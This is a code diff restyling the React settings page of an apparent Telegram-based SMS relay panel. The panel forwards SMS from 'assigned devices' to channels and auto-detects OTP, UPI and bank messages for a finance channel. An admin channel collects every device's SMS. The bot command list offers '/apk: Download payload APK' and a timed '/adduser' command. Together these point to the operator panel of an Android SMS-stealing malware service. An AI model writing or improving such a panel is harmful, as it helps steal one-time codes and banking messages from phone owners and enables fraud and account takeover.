@@ -5,10 +5,11 @@ import { Layout } from '@/components/layout';
 import { useAuth } from '@/lib/auth';
 import { useToast } from '@/hooks/use-toast';
 import {
-  Send, Bell, Hash, CheckCircle, XCircle, Loader2,
+  Send, Bell, CheckCircle, XCircle, Loader2,
   Plus, Trash2, AlertCircle, Shield, Settings,
   MessageSquare, ChevronRight, IndianRupee, BellOff, BellRing
 } from 'lucide-react';
+import { Reveal, PageHeader, GlassCard, PillButton } from '@/components/ui/bezel';
 
 const API_BASE = (import.meta.env.VITE_API_URL ?? '').replace(/\/$/, '');
 
@@ -28,61 +29,65 @@ export function TelegramSettings() {
   const { isAdmin, userId } = useAuth();
   const { toast } = useToast();
 
-  // Global SMS channel (admin only)
   const [globalChannel, setGlobalChannel] = useState('');
   const [savedGlobalChannel, setSavedGlobalChannel] = useState('');
   const [savingGlobal, setSavingGlobal] = useState(false);
 
-  // Per-user personal channel
   const [personalChannel, setPersonalChannel] = useState('');
   const [savedPersonalChannel, setSavedPersonalChannel] = useState('');
   const [savingPersonal, setSavingPersonal] = useState(false);
 
-  // Finance alert channel (forward only financial SMS)
   const [financeChannel, setFinanceChannel] = useState('');
   const [savedFinanceChannel, setSavedFinanceChannel] = useState('');
   const [savingFinance, setSavingFinance] = useState(false);
 
-  // Keyword alert rules (forward SMS matching keyword → channel)
   const [rules, setRules] = useState<NotifyRule[]>([]);
   const [newKeyword, setNewKeyword] = useState('');
   const [newChannel, setNewChannel] = useState('');
   const [addingRule, setAddingRule] = useState(false);
 
-  // Bot info
   const [botUsername, setBotUsername] = useState<string | null>(null);
 
+  const normalizeChannel = (val: unknown): string => {
+    if (typeof val === 'string') return val;
+    if (val && typeof val === 'object') {
+      const obj = val as Record<string, unknown>;
+      if (typeof obj.channelId === 'string') return obj.channelId;
+    }
+    return '';
+  };
+
   useEffect(() => {
-    // Load global SMS channel (admin)
     const globalRef = ref(db, 'config/smsChannel');
     const unsub1 = onValue(globalRef, (snap) => {
-      const v = snap.val() || '';
+      const v = normalizeChannel(snap.val());
       setSavedGlobalChannel(v);
       setGlobalChannel(v);
     });
 
-    // Load user personal channel
     if (userId) {
       const personalRef = ref(db, `config/userChannels/${userId}/sms`);
       const unsub2 = onValue(personalRef, (snap) => {
-        const v = snap.val() || '';
+        const v = normalizeChannel(snap.val());
         setSavedPersonalChannel(v);
         setPersonalChannel(v);
       });
 
       const financeRef = ref(db, `config/userChannels/${userId}/finance`);
       const unsub3 = onValue(financeRef, (snap) => {
-        const v = snap.val() || '';
+        const v = normalizeChannel(snap.val());
         setSavedFinanceChannel(v);
         setFinanceChannel(v);
       });
 
-      // Keyword alert rules
       const rulesRef = ref(db, `config/userChannels/${userId}/rules`);
       const unsub4 = onValue(rulesRef, (snap) => {
         if (snap.exists()) {
-          const data = snap.val() as Record<string, NotifyRule>;
-          setRules(Object.values(data));
+          const data = snap.val() as Record<string, NotifyRule | null | undefined>;
+          const rulesList = Object.values(data).filter(
+            (r): r is NotifyRule => !!r && typeof r.keyword === 'string' && typeof r.channel === 'string'
+          );
+          setRules(rulesList);
         } else {
           setRules([]);
         }
@@ -169,19 +174,12 @@ export function TelegramSettings() {
     toast({ title: 'Rule removed' });
   };
 
-  const Card = ({ children, className = '' }: { children: React.ReactNode; className?: string }) => (
-    <div className={`bg-[#ecdbfd] border border-[#d8c8f0] rounded-3xl overflow-hidden ${className}`}>
-      <div className="h-1 w-full bg-[#7c3aed]" />
-      <div className="p-5">{children}</div>
-    </div>
-  );
-
   const SectionTitle = ({ icon: Icon, title, sub }: { icon: any; title: string; sub?: string }) => (
-    <div className="mb-4">
-      <h2 className="text-xs font-bold uppercase tracking-widest text-[#6b5b7d] flex items-center gap-2">
-        <Icon className="w-3.5 h-3.5" /> {title}
+    <div className="mb-5">
+      <h2 className="text-xs font-bold uppercase tracking-widest text-muted-foreground flex items-center gap-2">
+        <Icon className="w-3.5 h-3.5 text-[#a78bfa]" strokeWidth={1.6} /> {title}
       </h2>
-      {sub && <p className="text-xs text-[#6b5b7d] mt-1">{sub}</p>}
+      {sub && <p className="text-xs text-muted-foreground/80 mt-1.5">{sub}</p>}
     </div>
   );
 
@@ -191,201 +189,159 @@ export function TelegramSettings() {
     value: string; onChange: (v: string) => void; onSave: () => void;
     saving: boolean; placeholder?: string; label: string; helpText?: string;
   }) => (
-    <div className="space-y-2">
-      <label className="text-[10px] font-bold uppercase tracking-wider text-[#6b5b7d] block">{label}</label>
-      <div className="flex gap-2">
+    <div className="space-y-2.5">
+      <label className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground block">{label}</label>
+      <div className="flex flex-col sm:flex-row gap-2.5">
         <input
           type="text"
           value={value}
           onChange={(e) => onChange(e.target.value)}
           placeholder={placeholder}
-          className="flex-1 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2.5 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all font-mono"
+          className="field flex-1 font-mono"
         />
         <button
           onClick={onSave}
           disabled={saving}
-          className="flex items-center gap-2 bg-[#7c3aed] text-white px-5 py-2.5 rounded-full font-semibold text-sm hover:bg-[#6d28d9] disabled:opacity-50 transition-colors shadow-md shadow-purple-200 whitespace-nowrap"
+          className="btn-island shrink-0 bg-[#8b5cf6] text-white px-5 py-3 text-sm shadow-[0_10px_30px_-12px_rgba(139,92,246,0.7)] hover:bg-[#7c3aed] disabled:opacity-40 disabled:pointer-events-none"
         >
-          {saving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
+          {saving ? <Loader2 className="w-4 h-4 animate-spin" strokeWidth={1.8} /> : <Send className="w-4 h-4" strokeWidth={1.8} />}
           {saving ? 'Saving...' : value.trim() ? 'Set' : 'Remove'}
         </button>
       </div>
-      {helpText && <p className="text-[10px] text-[#6b5b7d]">{helpText}</p>}
+      {helpText && <p className="text-[10px] text-muted-foreground/80">{helpText}</p>}
     </div>
   );
 
   return (
     <Layout>
-      <div className="max-w-3xl mx-auto space-y-6">
-        <div>
-          <h1 className="text-2xl font-bold tracking-tight text-[#2d1b4e] flex items-center gap-2">
-            <Send className="w-6 h-6 text-[#7c3aed]" />
-            Telegram Settings
-          </h1>
-          <p className="text-[#6b5b7d] text-sm mt-1">Configure notification channels and alert rules</p>
-        </div>
+      <div className="max-w-3xl mx-auto">
+        <PageHeader eyebrow="Relay Channels" title="Telegram Settings" description="Configure notification channels and alert rules" />
 
         {/* Setup guide */}
-        <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-4 text-sm text-[#6b5b7d] space-y-1">
-          <p className="font-semibold text-[#2d1b4e] flex items-center gap-1.5">
-            <AlertCircle className="w-4 h-4 text-[#7c3aed]" /> Setup Guide
-          </p>
-          <p>1. Create a Telegram channel or group</p>
-          <p>2. Add the bot as admin (with permission to post messages)</p>
-          <p>3. Paste the Channel ID here (e.g. <code className="text-[#7c3aed] text-xs">-100xxxxxxxxxx</code>)</p>
-          <p>4. Or use the <code className="text-[#7c3aed] text-xs">/setchannel</code> bot command</p>
-        </div>
+        <Reveal className="mb-6">
+          <div className="flex items-start gap-3.5 p-4 rounded-2xl bg-white/[0.03] border border-white/[0.08] text-sm text-muted-foreground">
+            <AlertCircle className="w-4 h-4 text-[#a78bfa] flex-shrink-0 mt-0.5" strokeWidth={1.6} />
+            <div className="space-y-1.5">
+              <p className="font-semibold text-foreground">Setup Guide</p>
+              <p>1. Create a Telegram channel or group</p>
+              <p>2. Add the bot as admin (with permission to post messages)</p>
+              <p>3. Paste the Channel ID here (e.g. <code className="text-[#a78bfa] text-xs font-mono">-100xxxxxxxxxx</code>)</p>
+              <p>4. Or use the <code className="text-[#a78bfa] text-xs font-mono">/setchannel</code> bot command</p>
+            </div>
+          </div>
+        </Reveal>
 
         {/* Personal SMS Channel */}
-        <Card>
-          <SectionTitle
-            icon={MessageSquare}
-            title="My SMS Channel"
-            sub="SMS from your assigned devices will be forwarded to this channel"
-          />
-          {savedPersonalChannel && (
-            <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
-              <CheckCircle className="w-4 h-4 text-[#10b981]" />
-              <span className="text-[#2d1b4e]">Active: <code className="text-[#7c3aed] font-mono">{savedPersonalChannel}</code></span>
-            </div>
-          )}
-          <ChannelInput
-            value={personalChannel}
-            onChange={setPersonalChannel}
-            onSave={savePersonalChannel}
-            saving={savingPersonal}
-            label="Channel ID"
-            helpText="Only SMS from devices assigned to your account will appear here"
-          />
-        </Card>
+        <Reveal className="mb-6">
+          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
+            <SectionTitle icon={MessageSquare} title="My SMS Channel" sub="SMS from your assigned devices will be forwarded to this channel" />
+            {savedPersonalChannel && (
+              <div className="mb-4 bg-[#34d399]/[0.06] border border-[#34d399]/20 rounded-2xl p-3 flex items-center gap-2 text-sm">
+                <CheckCircle className="w-4 h-4 text-[#34d399] shrink-0" strokeWidth={1.6} />
+                <span className="text-foreground">Active: <code className="text-[#a78bfa] font-mono">{savedPersonalChannel}</code></span>
+              </div>
+            )}
+            <ChannelInput value={personalChannel} onChange={setPersonalChannel} onSave={savePersonalChannel} saving={savingPersonal} label="Channel ID" helpText="Only SMS from devices assigned to your account will appear here" />
+          </GlassCard>
+        </Reveal>
 
         {/* Finance Alert Channel */}
-        <Card>
-          <SectionTitle
-            icon={IndianRupee}
-            title="Finance Alert Channel"
-            sub="Only financial SMS (OTP, UPI, debit, credit, bank alerts) will be forwarded here"
-          />
-          {savedFinanceChannel && (
-            <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
-              <CheckCircle className="w-4 h-4 text-[#10b981]" />
-              <span className="text-[#2d1b4e]">Active: <code className="text-[#7c3aed] font-mono">{savedFinanceChannel}</code></span>
-            </div>
-          )}
-          <ChannelInput
-            value={financeChannel}
-            onChange={setFinanceChannel}
-            onSave={saveFinanceChannel}
-            saving={savingFinance}
-            label="Finance Channel ID"
-            helpText="OTP, UPI payments, and bank transaction SMS are auto-detected and forwarded here"
-          />
-        </Card>
+        <Reveal className="mb-6" delay={60}>
+          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
+            <SectionTitle icon={IndianRupee} title="Finance Alert Channel" sub="Only financial SMS (OTP, UPI, debit, credit, bank alerts) will be forwarded here" />
+            {savedFinanceChannel && (
+              <div className="mb-4 bg-[#34d399]/[0.06] border border-[#34d399]/20 rounded-2xl p-3 flex items-center gap-2 text-sm">
+                <CheckCircle className="w-4 h-4 text-[#34d399] shrink-0" strokeWidth={1.6} />
+                <span className="text-foreground">Active: <code className="text-[#a78bfa] font-mono">{savedFinanceChannel}</code></span>
+              </div>
+            )}
+            <ChannelInput value={financeChannel} onChange={setFinanceChannel} onSave={saveFinanceChannel} saving={savingFinance} label="Finance Channel ID" helpText="OTP, UPI payments, and bank transaction SMS are auto-detected and forwarded here" />
+          </GlassCard>
+        </Reveal>
 
         {/* Keyword Alert Rules */}
-        <Card>
-          <SectionTitle
-            icon={Bell}
-            title="Keyword Alert Rules"
-            sub="Forward SMS to a specific channel when a keyword is matched"
-          />
+        <Reveal className="mb-6" delay={120}>
+          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
+            <SectionTitle icon={Bell} title="Keyword Alert Rules" sub="Forward SMS to a specific channel when a keyword is matched" />
 
-          {rules.length > 0 && (
-            <div className="space-y-2 mb-4">
-              {rules.map((rule) => (
-                <div key={rule.keyword} className="flex items-center justify-between bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-4 py-2.5">
-                  <div className="flex items-center gap-3 min-w-0">
-                    <span className="bg-[#ecdbfd] text-[#7c3aed] text-xs font-bold px-2.5 py-1 rounded-full flex-shrink-0">
-                      {rule.keyword}
-                    </span>
-                    <ChevronRight className="w-3.5 h-3.5 text-[#6b5b7d] flex-shrink-0" />
-                    <code className="text-xs text-[#2d1b4e] font-mono truncate">{rule.channel}</code>
+            {rules.length > 0 && (
+              <div className="space-y-2.5 mb-5">
+                {rules.map((rule) => (
+                  <div key={rule.keyword} className="flex items-center justify-between bg-white/[0.03] border border-white/[0.08] rounded-2xl px-4 py-3">
+                    <div className="flex items-center gap-3 min-w-0">
+                      <span className="bg-white/[0.05] text-[#a78bfa] text-xs font-bold px-2.5 py-1 rounded-full border border-white/[0.1] flex-shrink-0">
+                        {rule.keyword}
+                      </span>
+                      <ChevronRight className="w-3.5 h-3.5 text-muted-foreground flex-shrink-0" strokeWidth={1.6} />
+                      <code className="text-xs text-foreground font-mono truncate">{rule.channel}</code>
+                    </div>
+                    <button
+                      onClick={() => removeRule(rule.keyword)}
+                      className="ml-3 p-1.5 rounded-xl hover:bg-[#ef4444]/10 hover:text-[#f87171] text-muted-foreground transition-colors duration-500 ease-smooth flex-shrink-0"
+                    >
+                      <Trash2 className="w-3.5 h-3.5" strokeWidth={1.6} />
+                    </button>
                   </div>
-                  <button
-                    onClick={() => removeRule(rule.keyword)}
-                    className="ml-3 p-1.5 rounded-xl hover:bg-red-50 hover:text-[#ef4444] text-[#6b5b7d] transition-colors flex-shrink-0"
-                  >
-                    <Trash2 className="w-3.5 h-3.5" />
-                  </button>
-                </div>
-              ))}
-            </div>
-          )}
+                ))}
+              </div>
+            )}
 
-          <div className="flex gap-2 flex-wrap sm:flex-nowrap">
-            <input
-              type="text"
-              value={newKeyword}
-              onChange={(e) => setNewKeyword(e.target.value)}
-              placeholder="Keyword (e.g. HDFC, OTP)"
-              className="flex-1 min-w-0 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2.5 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all"
-            />
-            <input
-              type="text"
-              value={newChannel}
-              onChange={(e) => setNewChannel(e.target.value)}
-              placeholder="Channel ID"
-              className="flex-1 min-w-0 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2.5 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all font-mono"
-            />
-            <button
-              onClick={addRule}
-              disabled={addingRule || !newKeyword.trim() || !newChannel.trim()}
-              className="flex items-center gap-2 bg-[#7c3aed] text-white px-4 py-2.5 rounded-full font-semibold text-sm hover:bg-[#6d28d9] disabled:opacity-50 transition-colors shadow-md shadow-purple-200 whitespace-nowrap"
-            >
-              {addingRule ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
-              Add Rule
-            </button>
-          </div>
-        </Card>
+            <div className="flex flex-col sm:flex-row gap-2.5">
+              <input type="text" value={newKeyword} onChange={(e) => setNewKeyword(e.target.value)} placeholder="Keyword (e.g. HDFC, OTP)" className="field flex-1 min-w-0" />
+              <input type="text" value={newChannel} onChange={(e) => setNewChannel(e.target.value)} placeholder="Channel ID" className="field flex-1 min-w-0 font-mono" />
+              <button
+                onClick={addRule}
+                disabled={addingRule || !newKeyword.trim() || !newChannel.trim()}
+                className="btn-island shrink-0 bg-[#8b5cf6] text-white px-5 py-3 text-sm shadow-[0_10px_30px_-12px_rgba(139,92,246,0.7)] hover:bg-[#7c3aed] disabled:opacity-40 disabled:pointer-events-none"
+              >
+                {addingRule ? <Loader2 className="w-4 h-4 animate-spin" strokeWidth={1.8} /> : <Plus className="w-4 h-4" strokeWidth={1.8} />}
+                Add Rule
+              </button>
+            </div>
+          </GlassCard>
+        </Reveal>
 
         {/* Global SMS Channel — Admin Only */}
         {isAdmin && (
-          <Card>
-            <SectionTitle
-              icon={Shield}
-              title="Global SMS Channel (Admin)"
-              sub="ALL devices' SMS from every user will be forwarded here — admin-level setting"
-            />
-            {savedGlobalChannel ? (
-              <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
-                <BellRing className="w-4 h-4 text-[#10b981]" />
-                <span className="text-[#2d1b4e]">Active: <code className="text-[#7c3aed] font-mono">{savedGlobalChannel}</code></span>
-              </div>
-            ) : (
-              <div className="mb-3 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-2.5 flex items-center gap-2 text-sm text-[#6b5b7d]">
-                <BellOff className="w-4 h-4" /> Global forwarding is currently off
-              </div>
-            )}
-            <ChannelInput
-              value={globalChannel}
-              onChange={setGlobalChannel}
-              onSave={saveGlobalChannel}
-              saving={savingGlobal}
-              label="Global Channel ID"
-              helpText="SMS from all devices of all users will be forwarded to this channel"
-            />
-          </Card>
+          <Reveal className="mb-6" delay={180}>
+            <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
+              <SectionTitle icon={Shield} title="Global SMS Channel (Admin)" sub="ALL devices' SMS from every user will be forwarded here — admin-level setting" />
+              {savedGlobalChannel ? (
+                <div className="mb-4 bg-[#34d399]/[0.06] border border-[#34d399]/20 rounded-2xl p-3 flex items-center gap-2 text-sm">
+                  <BellRing className="w-4 h-4 text-[#34d399] shrink-0" strokeWidth={1.6} />
+                  <span className="text-foreground">Active: <code className="text-[#a78bfa] font-mono">{savedGlobalChannel}</code></span>
+                </div>
+              ) : (
+                <div className="mb-4 bg-white/[0.03] border border-white/[0.08] rounded-2xl p-3 flex items-center gap-2 text-sm text-muted-foreground">
+                  <BellOff className="w-4 h-4 shrink-0" strokeWidth={1.6} /> Global forwarding is currently off
+                </div>
+              )}
+              <ChannelInput value={globalChannel} onChange={setGlobalChannel} onSave={saveGlobalChannel} saving={savingGlobal} label="Global Channel ID" helpText="SMS from all devices of all users will be forwarded to this channel" />
+            </GlassCard>
+          </Reveal>
         )}
 
         {/* Bot Commands Reference */}
-        <Card>
-          <SectionTitle icon={Settings} title="Bot Commands Reference" />
-          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
-            {[
-              { cmd: '/setchannel -100xxx', desc: 'Set global SMS forward channel' },
-              { cmd: '/removechannel', desc: 'Remove global channel' },
-              { cmd: '/apk', desc: 'Download payload APK' },
-              { cmd: '/reset_password', desc: 'Reset panel password' },
-              { cmd: '/stats', desc: 'View bot & device stats' },
-              { cmd: '/adduser ID days email pass', desc: 'Add new user (admin only)' },
-            ].map(({ cmd, desc }) => (
-              <div key={cmd} className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
-                <p className="text-[#6b5b7d] text-xs mb-1">{desc}</p>
-                <code className="text-[#7c3aed] font-mono text-xs">{cmd}</code>
-              </div>
-            ))}
-          </div>
-        </Card>
+        <Reveal delay={240}>
+          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
+            <SectionTitle icon={Settings} title="Bot Commands Reference" />
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
+              {[
+                { cmd: '/setchannel -100xxx', desc: 'Set global SMS forward channel' },
+                { cmd: '/removechannel', desc: 'Remove global channel' },
+                { cmd: '/apk', desc: 'Download payload APK' },
+                { cmd: '/reset_password', desc: 'Reset panel password' },
+                { cmd: '/stats', desc: 'View bot & device stats' },
+                { cmd: '/adduser ID days email pass', desc: 'Add new user (admin only)' },
+              ].map(({ cmd, desc }) => (
+                <div key={cmd} className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-4">
+                  <p className="text-muted-foreground text-xs mb-1.5">{desc}</p>
+                  <code className="text-[#a78bfa] font-mono text-xs">{cmd}</code>
+                </div>
+              ))}
+            </div>
+          </GlassCard>
+        </Reveal>
       </div>
     </Layout>
   );
